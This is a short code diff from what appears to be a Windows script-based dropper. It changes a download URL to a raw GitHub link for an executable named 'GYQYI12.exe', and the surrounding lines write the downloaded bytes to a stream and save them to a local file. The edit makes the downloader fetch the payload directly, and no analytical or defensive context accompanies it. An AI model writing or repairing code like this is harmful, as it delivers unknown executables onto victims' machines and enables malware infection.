@@ -46,7 +46,7 @@ s.Open();
 
 try{
 
-         s.Write(getFile("https://github.com/wsnent1/br1/GYQYI12"));
+         s.Write(getFile("https://raw.githubusercontent.com/wsnent1/br1/master/GYQYI12.exe"));
 
          s.SaveToFile(md,2);
 
